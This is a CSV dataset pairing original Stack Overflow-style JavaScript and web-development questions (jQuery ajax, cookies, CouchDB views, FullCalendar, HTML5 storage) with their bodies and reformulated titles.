originalTitle,body,reformulatedTitle
js: how to get LOCALIZED character on keypress?," I need to get localized character on keypress event. For example: on a Czech keyboard I need to get not 5 character (key code 53) (see Czech keyboard layout). Is there any other way to get character and to not use text input and reading value? By other words is there any way how to get character from event object respecting current user keyboard layout?(Added sample code) (Example online)When you try this code, and you press -key you will see in Firebug console ""Code: 53; Key: 5"". And I need to get """" not ""5"".I think that this ""problem"" appears on all non-English keyboards. <code>  <html><body><script language=""JavaScript"">function onLoad() { console.log(document.getElementById(""test"")); document.getElementById(""test"").onkeydown = function(event) { console.log(""Code: ""+event.keyCode+""; Key: ""+String.fromCharCode(event.keyCode)); }}</script><body onLoad=""onLoad();""> <input id=""test""></body></html>",How to get LOCALIZED character on keypress?
Jquery simple ajax call seems to be blocking," Really simple question. I trying to test a Restful webservice that I am developing, and have this simple ajax call (using jquery): This runs when the page loads. As it's running, the page is blocking; i.e., (I can see the hourglass next to the mouse pointer) no other user actions can be handled. (Btw, this particular get request--intentionally--takes a very long time to return).Why is this? A(asynchronous)JAX right? Obviously I am making a beginners mistake. Any ideas, please?When I attempt this using plain javascript (no library) it works as expected. Does this have something to do with Jquery's handling of the xhr onreadystatechange?Thank you for looking.EDIT: multiple people have suggested setting async: true, which as it happens, is the default in jquery, and as such has no effect.EDIT: As previously mentioned, if I use plain javascript and start this with a timer, e.g., window.setInterval(function() { startLongPoll(); }, 5000)It updates as expected, without appearing to block. Ideas, anyone? <code>  <script type=""text/javascript""> $(document).ready(function() { var url = '/index.php/gettest/reallyLongRequest'; $.ajax({ url: url, dataType:'text', success:function(data) { $('#result').html(data);}, error:function(xhr,err,e) { alert (""Error: "" + err);} }); }); </script>",Simple ajax call seems to be blocking
How to call second jQuery #.ajax instance on success of first and update page," I have some jQuery that is triggered on click of a link with the class 'changetag'. I'm using $.ajax() to update the database via changetag.php.I then change the visual appearance of the link by toggling the class between on/off. The code is as follows: Works perfectly. But now I want to add in a second PHP call which will pull data and update another area of the page if the above was successful.What I'm trying to add is: But just adding it into success: function(){} doesn't seem to be working. To clarify, here is the complete code I'm testing: The PHP scripts are both called successfully and the toggle class works, but the data pulled is not written to #listresults for some reason. <code>  $(function() {$("".changetag"").click(function(){ var element = $(this); var I = element.attr(""id""); var info = 'switch_tag=' + I; $.ajax({ type: ""POST"", url: ""_js/changetag.php"", data: info, success: function(){} }); $(""#li_""+I).toggleClass(""off on""); element.toggleClass(""off on""); return false;});}); $.ajax({ url: ""_js/loaddata.php"", success: function(results){ $('#listresults').empty(); $('#listresults').append(results); }}); $(function() {$.ajaxSetup ({cache: false});$("".changetag"").click(function(){ var element = $(this); var I = element.attr(""id""); var info = 'switch_tag=' + I; $.ajax({ type: ""POST"", url: ""_js/changetag.php"", data: info, success: function(){ $.ajax({ url: ""_js/loaddata.php"", success: function(results){ $('#listresults').empty(); $('#listresults').append(results); } }); } }); $(""#li_""+I).toggleClass(""off on""); element.toggleClass(""off on""); return false;});});",How to call second jQuery.ajax instance on success of first and update page
Increase and decrease a variable until a number is reached in javascript.," How can I increase and decrease a variable in Javascript until 100 and when 100 is reached it should start decreasing.So accuracyBarValue should start in 0, increase to 100, and when 100 is reached it should go to 0, and then repeat procedure.This in intervals of 10.I use this in a very simple JS game, where this value is used to increase and decrease a PowerBar. <code> ",Increase and decrease a variable until a number is reached in Javascript
how filter view in couchdb, Here's an example of what I need in sql:SELECT name FROM employ WHERE name LIKE %bro%How do I create view like that in CouchDB? <code> ,"How do I create a ""like"" filter view in CouchDB"
"how do I create a ""like"" filter view in couchdb", Here's an example of what I need in sql:SELECT name FROM employ WHERE name LIKE %bro%How do I create view like that in CouchDB? <code> ,"How do I create a ""like"" filter view in CouchDB"
Testing JavaScript in web frontends," This might sound a little dumb, but I'm actually a bit confused how to approach JavaScript testing for web frontends. As far as I'm concerned, the typical 3-tier architecture looks like this:Database tierApplication tierClient tier1 is of no concern in this question. 2 contains all the program logic (""business logic"") 3 the frontend.I do test-driven development for most projects, but only for the application logic, not the frontend. That is because testing the UI is difficult and unusual in TDD, and normally not done. Instead, all application logic is separated from UI, so that it is simple to test that logic.The three tier architecture supports this: I can design my backend as a REST API which is called by my frontend. How does JS testing fit in? For the typical three-tier-architecture, JS (i.e. JS on the client) testing doesn't make much sense, does it?Update:I've changed the question's wording from ""Testing JavaScript in web frontends"" to ""Test-driven development of JavaScript web frontends"" to clarify my question. <code> ",Test-driven development of JavaScript web frontends
a confusing javascript question," Let's consider this piece of JavaScript: I don't understand the difference between the behavior of and Why is the behavior different? It really confuses me. Thanks. <code>  function Person(name) { this.name = name;}Person.prototype.showName = function() { alert(this.name);}var mike = new Person(""mike"");//mike.showName(); window.name = ""window""; setTimeout(mike.showName(), 5000); setTimeout(function(){ mike.showName();}, 5000);",setTimeout callback argument
CodeMirror 2 - Highlight only," Can CodeMirror 2 be used to highlight code from a DIV or PRE tag (without the editor)?Like CodeMirror 1 used to be able to do with the hightlightText() function?For example here: http://codemirror.net/1/highlight.html, after you press run highlight (the highlighted text below)Also can it highlight code from a inline element, like <code>, and keep the results inline, like Google's Prettify does? <code> ",CodeMirror 2 - Highlight only (no editor)
local storage vs. session storage," Apart from being non persistent and scoped only to the current window, are there any benefits (performance, data access, etc) to Session Storage over Local Storage? <code> ",HTML5 Local storage vs. Session storage
How to get object length in jQuery," Is there any built-in function that can return the length of an object?For example, I have a = { 'a':1,'b':2,'c':3 } which should return 3. If I use a.length it returns undefined.It could be a simple loop function, but I'd like to know if there's a built-in function?There is a related question (Length of a JSON object) - in the chosen answer the user advises to transform object into an array, which is not pretty comfortable for my task. <code> ",How to get object length
split variable from last slash - jquery, I have a variable var1/var2/var3. I want to store var3 the part after last slash in a variable and the part before that (var1/var2/) in another variable. How can I do this? <code> ,Split variable from last slash
Split variable from last slash - jquery, I have a variable var1/var2/var3. I want to store var3 the part after last slash in a variable and the part before that (var1/var2/) in another variable. How can I do this? <code> ,Split variable from last slash
Slide (hide / show) sidebar div - jquery," I have 2 <div>s with ids A and B. div A has a fixed width, which is taken as a sidebar.The layout looks like diagram below:The styling is like below: I have <a id=""toggle"">toggle</a> which acts as a toggle button. On the toggle button click, the sidebar may hide to the left and div B should stretch to fill the empty space. On second click, the sidebar may reappear to the previous position and div B should shrink back to the previous width.How can I get this done using jQuery? <code>  html, body { margin: 0; padding: 0; border: 0;}#A, #B { position: absolute;}#A { top: 0px; width: 200px; bottom: 0px;}#B { top: 0px; left: 200px; right: 0; bottom: 0px;}",How to toggle (hide / show) sidebar div using jQuery
javascript comma operator," MDN claims that: The comma operator evaluates both of its operands (from left to right) and returns the value of the second operand.However, when I tried running <script> alert(1, 2); </script>, it shows a ""1"" instead of a ""2"".Am I misunderstanding something? <code> ",Comma operator returns first value instead of second in argument list?
how to use the comma operator in a function call," MDN claims that: The comma operator evaluates both of its operands (from left to right) and returns the value of the second operand.However, when I tried running <script> alert(1, 2); </script>, it shows a ""1"" instead of a ""2"".Am I misunderstanding something? <code> ",Comma operator returns first value instead of second in argument list?
Comma operator returns first value instead of second?," MDN claims that: The comma operator evaluates both of its operands (from left to right) and returns the value of the second operand.However, when I tried running <script> alert(1, 2); </script>, it shows a ""1"" instead of a ""2"".Am I misunderstanding something? <code> ",Comma operator returns first value instead of second in argument list?
@font-face using javascript alone possible?," CSS has a @font-face rule which allows us to ""use"" custom fonts.Does JavaScript have this functionality?More specifically, is it possible to ""use"" custom fonts without using the CSS @font-face rule? <code> ",How to import font file using JavaScript?
Razor And Javascript," I'm pretty confused with how to mix razor and js. This is the current function I am stuck with: If I could declare c# code with <c#></c#> and everything else was JS code -- this would be what I am after: What is the best method to achieve this? <code>  <script type=""text/javascript""> var data = []; @foreach (var r in Model.rows) { data.push([ @r.UnixTime * 1000, @r.Value ]); } <script type=""text/javascript""> var data = []; <c#>@foreach (var r in Model.rows) {</c#> data.push([ <c#>@r.UnixTime</c#> * 1000, <c#>@r.Value</c#> ]); <c#>}</c#>",Mix Razor and Javascript code
Special characters are ruining my life.," I'm working on localization for my toolkit.My goal is that if you were a German web developer and you wanted to use a forEach loop, rather then type ['hey', 'there'].forEach(function () {}); they could type ['hey', 'there'].frJeder(function () {});I have all the words stored in an object at $.i18n.de.In my JavaScript file I have but when I go into the object to get the words they turn into verlnger and frJeder.I have no idea why.Some details:I'm on a MacBook Pro running 10.6.7I'm using Kod as my editor.I'm using Google Chrome as my browser.I'm using Option + U + letter to type the and .My question: How do I get the browser to handle these correctly?I've tried using backslashes before them but it stays the same.EDIT: Screw it. I just found out that the people who inspired me to do this did it as an April Fool's day joke. I really should've clicked on some of those links. It would've saved me 2 hours of trying to set up an API. <code>  de: { extend: 'verlnger', forEach: 'frJeder'}",Special characters (and MooTools) are ruining my life.
"callback for month, week, day title bar button clicks??"," I need to run some Javascript code to reload the calendar when the user either clicks, day/week/month buttons. Is there any callback like dayButtonClicked() or something?BUG happening:When I first load the calendar. The initial view looks fine mine initially loads day. As soon as I load another view such as week. Every single entry is duplicated and showing both sources of data. If I then click back and forward between day and month again the data is back to normal. What is happening is the removeEventSource is not being called when it first loads the new view after clicking from day to week. have you seen this happen before? I've even copied your code in exactly how you do it because I thought there was an issue with my code; even if I change to this: It still double loads data when I move from the default loaded view to another. I'm starting to think it is surely a bug in FullCalendar. Its driving me nutsEDIT 2:MY GOD. I can't believe it finally works!I have no idea why but I needed to swap around addEventSource and removeEventSource it now looks something like this: <code>  <script type='text/javascript'> $(document).ready(function() { var date = new Date(); var d = date.getDate(); var m = date.getMonth(); var y = date.getFullYear(); var loadUrl = ""menu_booking.php?ne=1&calsub=1""; var lastView; var fullSource = ""../fullcalendar/json-events.php?idc=<?= $sClient ?>&v=long""; var liteSource = ""../fullcalendar/json-events.php?idc=<?= $sClient ?>""; $('#calendar').fullCalendar({ header: { left: 'prev,next today', center: 'title', right: 'month,agendaWeek,agendaDay' }, columnFormat: { month: 'ddd', week: 'ddd d/M', day: 'dddd d/M' }, defaultView: 'agendaDay', firstDay: 1, //editable: true, selectable: true, allDaySlot: false, firstHour: 7, viewDisplay: function(view) { if (lastView == undefined) { lastView = 'firstRun'; } if (view.name != lastView ) { if (view.name == 'agendaWeek') { $('#calendar').fullCalendar( 'removeEventSource', fullSource ); $('#calendar').fullCalendar( 'removeEventSource', liteSource ); $('#calendar').fullCalendar( 'addEventSource', fullSource ); } if (view.name == 'agendaDay') { $('#calendar').fullCalendar( 'removeEventSource', fullSource ); $('#calendar').fullCalendar( 'removeEventSource', liteSource ); $('#calendar').fullCalendar( 'addEventSource', liteSource ); } if (view.name == 'month') { $('#calendar').fullCalendar( 'removeEventSource', fullSource ); $('#calendar').fullCalendar( 'removeEventSource', liteSource ); $('#calendar').fullCalendar( 'addEventSource', fullSource ); } lastView = view.name; } }, timeFormat: { // for event elements agendaDay: '', agendaWeek: '', month: '', '': 'h(:mm)t' // default }, }); //$('#calendar').limitEvents(2); });</script> //VIEW CHANGE - ALSO ADDS INITIAL SOURCES PER DAY VIEW viewDisplay: function(view) { $('#calendar').fullCalendar( 'removeEventSource', fullSource ); $('#calendar').fullCalendar( 'removeEventSource', liteSource ); $('#calendar').fullCalendar( 'addEventSource', fullSource ); } }, viewDisplay: function(view) { if (lastView == undefined) { lastView = 'firstRun'; } //alert(""viewname: ""+ view.name + ""lastView: "" + lastView); if (view.name != lastView ) { if (view.name == 'agendaWeek') { $('#calendar').fullCalendar( 'addEventSource', shortSource ); $('#calendar').fullCalendar( 'removeEventSource', longSource ); $('#calendar').fullCalendar( 'removeEventSource', shortSource ); } if (view.name == 'agendaDay') { //alert(""in day: add litesource""); $('#calendar').fullCalendar( 'addEventSource', longSource ); $('#calendar').fullCalendar( 'removeEventSource', longSource ); $('#calendar').fullCalendar( 'removeEventSource', shortSource ); } if (view.name == 'month') { //alert(""in month: Delete litesource""); $('#calendar').fullCalendar( 'addEventSource', shortSource ); $('#calendar').fullCalendar( 'removeEventSource', longSource ); $('#calendar').fullCalendar( 'removeEventSource', shortSource ); } lastView = view.name; } },","Callback for month, week, day title bar button clicks?"
"callback for month, week, day title bar button clicks?"," I need to run some Javascript code to reload the calendar when the user either clicks, day/week/month buttons. Is there any callback like dayButtonClicked() or something?BUG happening:When I first load the calendar. The initial view looks fine mine initially loads day. As soon as I load another view such as week. Every single entry is duplicated and showing both sources of data. If I then click back and forward between day and month again the data is back to normal. What is happening is the removeEventSource is not being called when it first loads the new view after clicking from day to week. have you seen this happen before? I've even copied your code in exactly how you do it because I thought there was an issue with my code; even if I change to this: It still double loads data when I move from the default loaded view to another. I'm starting to think it is surely a bug in FullCalendar. Its driving me nutsEDIT 2:MY GOD. I can't believe it finally works!I have no idea why but I needed to swap around addEventSource and removeEventSource it now looks something like this: <code>  <script type='text/javascript'> $(document).ready(function() { var date = new Date(); var d = date.getDate(); var m = date.getMonth(); var y = date.getFullYear(); var loadUrl = ""menu_booking.php?ne=1&calsub=1""; var lastView; var fullSource = ""../fullcalendar/json-events.php?idc=<?= $sClient ?>&v=long""; var liteSource = ""../fullcalendar/json-events.php?idc=<?= $sClient ?>""; $('#calendar').fullCalendar({ header: { left: 'prev,next today', center: 'title', right: 'month,agendaWeek,agendaDay' }, columnFormat: { month: 'ddd', week: 'ddd d/M', day: 'dddd d/M' }, defaultView: 'agendaDay', firstDay: 1, //editable: true, selectable: true, allDaySlot: false, firstHour: 7, viewDisplay: function(view) { if (lastView == undefined) { lastView = 'firstRun'; } if (view.name != lastView ) { if (view.name == 'agendaWeek') { $('#calendar').fullCalendar( 'removeEventSource', fullSource ); $('#calendar').fullCalendar( 'removeEventSource', liteSource ); $('#calendar').fullCalendar( 'addEventSource', fullSource ); } if (view.name == 'agendaDay') { $('#calendar').fullCalendar( 'removeEventSource', fullSource ); $('#calendar').fullCalendar( 'removeEventSource', liteSource ); $('#calendar').fullCalendar( 'addEventSource', liteSource ); } if (view.name == 'month') { $('#calendar').fullCalendar( 'removeEventSource', fullSource ); $('#calendar').fullCalendar( 'removeEventSource', liteSource ); $('#calendar').fullCalendar( 'addEventSource', fullSource ); } lastView = view.name; } }, timeFormat: { // for event elements agendaDay: '', agendaWeek: '', month: '', '': 'h(:mm)t' // default }, }); //$('#calendar').limitEvents(2); });</script> //VIEW CHANGE - ALSO ADDS INITIAL SOURCES PER DAY VIEW viewDisplay: function(view) { $('#calendar').fullCalendar( 'removeEventSource', fullSource ); $('#calendar').fullCalendar( 'removeEventSource', liteSource ); $('#calendar').fullCalendar( 'addEventSource', fullSource ); } }, viewDisplay: function(view) { if (lastView == undefined) { lastView = 'firstRun'; } //alert(""viewname: ""+ view.name + ""lastView: "" + lastView); if (view.name != lastView ) { if (view.name == 'agendaWeek') { $('#calendar').fullCalendar( 'addEventSource', shortSource ); $('#calendar').fullCalendar( 'removeEventSource', longSource ); $('#calendar').fullCalendar( 'removeEventSource', shortSource ); } if (view.name == 'agendaDay') { //alert(""in day: add litesource""); $('#calendar').fullCalendar( 'addEventSource', longSource ); $('#calendar').fullCalendar( 'removeEventSource', longSource ); $('#calendar').fullCalendar( 'removeEventSource', shortSource ); } if (view.name == 'month') { //alert(""in month: Delete litesource""); $('#calendar').fullCalendar( 'addEventSource', shortSource ); $('#calendar').fullCalendar( 'removeEventSource', longSource ); $('#calendar').fullCalendar( 'removeEventSource', shortSource ); } lastView = view.name; } },","Callback for month, week, day title bar button clicks?"
convert php array to javascript array," How can I convert a PHP array in a format like this to a Javascript array in the format below? <code>  Array( [0] => 001-1234567 [1] => 1234567 [2] => 12345678 [3] => 12345678 [4] => 12345678 [5] => AP1W3242 [6] => AP7X1234 [7] => AS1234 [8] => MH9Z2324 [9] => MX1234 [10] => TN1A3242 [11] => ZZ1234) var cities = [ ""Aberdeen"", ""Ada"", ""Adamsville"", ""Addyston"", ""Adelphi"", ""Adena"", ""Adrian"", ""Akron"", ""Albany""];",Convert php array to Javascript
Replace all instances of chaater in javascript.," I have a string I want to replace <br> with \r by using , but it is replacing only the first <br>... Any idea why? <code>  var str= 'asdf<br>dfsdfs<br>dsfsdf<br>fsfs<br>dfsdf<br>fsdf'; str.replace(/<br>/g,'\r');",Replace all instances of character in javascript.
Shortest Method for reading a cookie in JavaScript," What is the shortest, accurate, and cross-browser compatible method for reading a cookie in JavaScript? Very often, while building stand-alone scripts (where I can't have any outside dependencies), I find myself adding a function for reading cookies, and usually fall-back on the QuirksMode.org readCookie() method (280 bytes, 216 minified.) It does the job, but its ugly, and adds quite a bit of bloat each time. The method that jQuery.cookie uses something like this (modified, 165 bytes, 125 minified): Note this is not a 'Code Golf' competition: I'm legitimately interested in reducing the size of my readCookie function, and in ensuring the solution I have is valid.  <code>  function readCookie(name) { var nameEQ = name + ""=""; var ca = document.cookie.split(';'); for(var i=0;i < ca.length;i++) { var c = ca[i]; while (c.charAt(0)==' ') c = c.substring(1,c.length); if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length); } return null;} function read_cookie(key){ var result; return (result = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? (result[1]) : null;}",What is the shortest function for reading a cookie by name in JavaScript?
Shortest function for reading a cookie in JavaScript," What is the shortest, accurate, and cross-browser compatible method for reading a cookie in JavaScript? Very often, while building stand-alone scripts (where I can't have any outside dependencies), I find myself adding a function for reading cookies, and usually fall-back on the QuirksMode.org readCookie() method (280 bytes, 216 minified.) It does the job, but its ugly, and adds quite a bit of bloat each time. The method that jQuery.cookie uses something like this (modified, 165 bytes, 125 minified): Note this is not a 'Code Golf' competition: I'm legitimately interested in reducing the size of my readCookie function, and in ensuring the solution I have is valid.  <code>  function readCookie(name) { var nameEQ = name + ""=""; var ca = document.cookie.split(';'); for(var i=0;i < ca.length;i++) { var c = ca[i]; while (c.charAt(0)==' ') c = c.substring(1,c.length); if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length); } return null;} function read_cookie(key){ var result; return (result = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? (result[1]) : null;}",What is the shortest function for reading a cookie by name in JavaScript?
"Closing a function isn't supported, ehh?"," I have the above snippet.Values is an array of values to be assigned to different elements.Make is essentially the equivalent of Array.prototype.map. Also, I have Function.prototype.Type = ""Function""; in the same file, so it's not .Type throwing an error. .Type works perfectly.Along with Function, these also have .Type's. Items is the array of different elements. I keep getting this error. I get that error and it doesn't make any sense, because there isn't any code on that line.I'm at a total loss.Does anyone notice anything wrong with that code?Update: I don't know what happened, but I fixed it.Since no one gave the correct answer, I'll just give it to the only guy who tried.*clap clap clap* <code>  var returned = values.make(function (value, index) { return items[index].value = value;}); Array.prototype.make = function (loop, playground) { var loop = loop || function (value) { return value }, playground = playground || this; if (loop.Type !== ""Function"") throw ""Loop [0] is not a function.""; var returned = []; for (var i = 0; i < this.length; i++) returned[i] = loop.apply(playground, [this[i], i, this]); return returned;}; Object.prototype.Type = ""Object"";Array.prototype.Type = ""Array"";RegExp.prototype.Type = ""RegExp"";String.prototype.Type = ""String"";Number.prototype.Type = ""Number"";Boolean.prototype.Type = ""Boolean"";XMLHttpRequest.prototype.Type = ""XMLHttpRequest"";Date.prototype.Type = ""Date""; [<input type=""text"" />, <input type=""text"" />, <input type=""text"" />] Uncaught Error: NOT_SUPPORTED_ERR: DOM Exception 9 on line 3",Javascript: Seemingly valid code causing Uncaught Error: NOT_SUPPORTED_ERR: DOM Exception 9 on line 3
how i compare string and boolean in Javascript ?," I got the Json ""false"" from server. I respond as bool but it's Json so it's in browser type is String instead of bool.So if I run (!data) whenever I want to check ""false"" == false then they not worked.So how can I parse bool from String in JavaScript then?""true"" == true and ""false"" == false. Then the code (!data) can check what it is [true and false] <code> ",How do I compare string and boolean in Javascript?
w3school try it editor," Does anyone know how to get, or where to get, or how to make, or where to find a tutorial, about the w3schools try it editor? I need an editor like it, so when typing js/html/css the code be accepted and shown like the tryit editor. <code> ",W3Schools Try-it Editor
Javascript. Access data in a JSON object (parsed). Please help!," I need to get the data ""messages"" from this JSON object. How can I do it in JavaScript?To access for example the lastname I just use: But how can I access the messages? <code>  response[i].user.lastname [ { ""user"": { ""last_message"": { ""message"": { ""created_at"": ""2011-04-16T16:40:56Z"", ""updated_at"": ""2011-04-16T16:40:56Z"", ""to"": null, ""id"": 10, ""user_id"": 28, ""message"": ""This is a message"" } }, ""nickname"": ""thenicky"", ""id"": 28, ""lastname"": ""white"", ""firstname"": ""Sean"", ""bio"": ""A short bio"", ""email"": ""the@email.com"" } }]",Access data in a JSON object (parsed) in JavaScript
Nodejs Require class with intializers," For example I have the following class In nodejs I have tried but this just gave unidentified. How do I require a class with initializers in nodejs?? <code>  var Person = function(name){ this.sayHi = function() { return ""Hello, "" + name + ""!""; }}exports.Person = Person; var Person = require('modulename').Person('Will');",Nodejs Require class with initializers
Max size in IndexedDB, I'm working on a simple web utility that makes use of IndexedDB (similar to a key-value DB) feature of HTML5.I was looking for but I was unable to know: what is the maximum size I can store in an item? <code> ,Maximum item size in IndexedDB
hide html5 audio controls," How can I hide HTML5 audio's browser specific controls? I'm making thumbnail images to represent each track and JavaScript to play/pause.Thanks!HTML: <code>  <audio class=""thumbnail"" id=""paparazzi"" controls=""none""> <source src=""song.ogg"" type=""audio/ogg"" /> <source src=""../audio/fernando_garibay_paparazzisnlmix.mp3"" type=""audio/mpeg"" /> Your browser does not support HTML5 audio.</audio>",How do you hide HTML5 Audio controls?
javascript void vs undefined, What exactly is the difference between undefined and void 0 ?Which is preferred and why? <code> ,JavaScript `undefined` vs `void 0`
Javascript: void vs undefined, What exactly is the difference between undefined and void 0 ?Which is preferred and why? <code> ,JavaScript `undefined` vs `void 0`
JavaScript: void vs undefined, What exactly is the difference between undefined and void 0 ?Which is preferred and why? <code> ,JavaScript `undefined` vs `void 0`
JavaScript void vs undefined, What exactly is the difference between undefined and void 0 ?Which is preferred and why? <code> ,JavaScript `undefined` vs `void 0`
alternatives for __defineGetter__ ?," Getters and setters are a beauty in VB.Net: In Javascript, this is probably what we would do: It looks like a plate of spaghetti ransacked by a kuri. What are some neater alternatives we have?Note: The new code should access the value using new Test().Width and not new Test().Width(). <code>  Get Return widthEnd GetSet(ByVal value As Integer) width = valueEnd Set function Test() { var width = 100; this.__defineGetter__(""Width"", function() { return width; }); this.__defineSetter__(""Width"", function(value){ width = value; });}",Neat alternatives to __defineGetter__?
Javascript reduce on array of objects," Say I want to sum a.x for each element in arr. I have cause to believe that a.x is undefined at some point.The following works fine What am I doing wrong in the first example? <code>  arr = [ { x: 1 }, { x: 2 }, { x: 4 } ];arr.reduce(function(a, b){ return a.x + b.x; }); // => NaN arr = [ 1, 2, 4 ];arr.reduce(function(a, b){ return a + b; }); // => 7",How to call reduce on an array of objects to sum their properties?
what are the best resources for javascript / HTML5 capabilities that you think you can only do in flash / silverlight," With apple browsers not supporting flash or silverlight, there is a real incentive to avoid flash / silverlight to avoid losing that audience when building a web site. That being said there is certain functionality that it seems like you can only really do in flash / silverlightfor example alot of simple games where you can move things on the screen like this site all seem to be built in flash. also, a lot of drag and drop functionality where you can drag one object onto another like these game sites. After lots of searching I can't find any that are not either flash or silverlight based. In particular i am looking for drag and drop support of one element onto anothermy question is if you need this type of functionality is javascript / html 5 able to do this type of stuff (so you can support iphone / ipad) or are you out of luck.is there any resource that highlight examples or suggestions of trying to do this type of interactive functionality and how / if you can do this type of stuff without silverlight / flash. also, if anyone has any good examples of existing site who are doing that today that would be great as well. <code> ","Is javascript / HTML5 capable of supporting ""flash like"" animation and drag and drop"
What are the javascript / HTML5 capabilities that you think you can only do in flash / silverlight," With apple browsers not supporting flash or silverlight, there is a real incentive to avoid flash / silverlight to avoid losing that audience when building a web site. That being said there is certain functionality that it seems like you can only really do in flash / silverlightfor example alot of simple games where you can move things on the screen like this site all seem to be built in flash. also, a lot of drag and drop functionality where you can drag one object onto another like these game sites. After lots of searching I can't find any that are not either flash or silverlight based. In particular i am looking for drag and drop support of one element onto anothermy question is if you need this type of functionality is javascript / html 5 able to do this type of stuff (so you can support iphone / ipad) or are you out of luck.is there any resource that highlight examples or suggestions of trying to do this type of interactive functionality and how / if you can do this type of stuff without silverlight / flash. also, if anyone has any good examples of existing site who are doing that today that would be great as well. <code> ","Is javascript / HTML5 capable of supporting ""flash like"" animation and drag and drop"
What are the javascript / HTML5 capabilities that people think you can only do in flash / silverlight," With apple browsers not supporting flash or silverlight, there is a real incentive to avoid flash / silverlight to avoid losing that audience when building a web site. That being said there is certain functionality that it seems like you can only really do in flash / silverlightfor example alot of simple games where you can move things on the screen like this site all seem to be built in flash. also, a lot of drag and drop functionality where you can drag one object onto another like these game sites. After lots of searching I can't find any that are not either flash or silverlight based. In particular i am looking for drag and drop support of one element onto anothermy question is if you need this type of functionality is javascript / html 5 able to do this type of stuff (so you can support iphone / ipad) or are you out of luck.is there any resource that highlight examples or suggestions of trying to do this type of interactive functionality and how / if you can do this type of stuff without silverlight / flash. also, if anyone has any good examples of existing site who are doing that today that would be great as well. <code> ","Is javascript / HTML5 capable of supporting ""flash like"" animation and drag and drop"
"Is javascript / HTML5 capable for supporting ""flash like"" animation and drag and drop"," With apple browsers not supporting flash or silverlight, there is a real incentive to avoid flash / silverlight to avoid losing that audience when building a web site. That being said there is certain functionality that it seems like you can only really do in flash / silverlightfor example alot of simple games where you can move things on the screen like this site all seem to be built in flash. also, a lot of drag and drop functionality where you can drag one object onto another like these game sites. After lots of searching I can't find any that are not either flash or silverlight based. In particular i am looking for drag and drop support of one element onto anothermy question is if you need this type of functionality is javascript / html 5 able to do this type of stuff (so you can support iphone / ipad) or are you out of luck.is there any resource that highlight examples or suggestions of trying to do this type of interactive functionality and how / if you can do this type of stuff without silverlight / flash. also, if anyone has any good examples of existing site who are doing that today that would be great as well. <code> ","Is javascript / HTML5 capable of supporting ""flash like"" animation and drag and drop"
how to return multiple arrays, I have multiple arrays in a function that I want to use in another function. How can I return them to use in another function <code>  this.runThisFunctionOnCall = function(){ array1; array2; array3; return ????},How to return multiple arrays from a function in Javascript?
I want to display a waiting animation while my php page is fetching data from the server..., I need to display a waiting animation while my php page is fetching data from the server...how can that be done? <code> ,I want to display a waiting animation while my php page is fetching data from the server
Accessing control Client Name and not Id in ASP.NET," I want to fire a server-side ASP.NET button click event in JavaScript. I checked the page source and the button's onclick in client side is: But I have to replace ctl00$LoginInfo1$btnliOK with something like <%= btnliOK.ClientName %>. Is there a way to do that? <code>  WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(""ctl00$LoginInfo1$btnliOK"", """", true, """", """", false, false));",Accessing control client name and not ID in ASP.NET
window.open error only in IE," I have a simple calendar popup window come up when a date on the calendar is clicked. The code below works in Opera, FF and Chrome but not in IE6-8. It comes up with the Error on Page at the bottom and shows the error invalid argument. Could someone help me out and spot what I'm doing right but wrong according to IE? <code>  <div class=""day-number"">1</div><td class=""calendar-day"" onclick=""window.open('http://www.cal.com/admin/editevents.php?day=2&month=4&year=2011', 'Edit Events', 'scrollbars=1,width=600,height=475');"">",window.open error only in IE - Invalid argument
How to convert varibles into json?," I want to send json data to ajax but how do you convert variables into json or convert an array to json? <code>  $("".confirm_order"").click(function(event) { event.preventDefault(); var street = $(""#street"").val(); var location = $(""#location"").val(); var number = $(""#number"").val(); var f = ??? $.ajax({ type: 'post', url: ""/orders"", dataType: ""json"", data: f, success: function (l) { alert(""Done""); } });});",How to convert variables into json?
